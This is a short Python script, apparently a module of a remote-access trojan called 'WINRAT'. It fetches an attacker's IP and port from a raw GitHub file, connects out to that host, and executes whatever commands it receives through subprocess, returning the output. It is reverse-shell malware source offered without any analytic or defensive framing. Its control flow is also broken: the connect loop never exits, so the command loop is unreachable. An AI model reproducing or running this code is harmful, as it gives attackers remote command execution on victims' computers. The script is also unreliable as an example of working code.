import requests, subprocess


def run():
    import socket, requests
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            lst = requests.get("https://raw.githubusercontent.com/pyscripter99/Modules-for-WINRAT/main/reverse_shell_ip.txt").text.split(":")
            ip = lst[0]
            port = lst[1]
            port = int(port)
            s.connect((socket.gethostbyname(ip), port))
            continue
        except: pass
    while True:
        data = s.recv(1024)
        if data:
            s.send(subprocess.getoutput(data.decode()).encode())

run()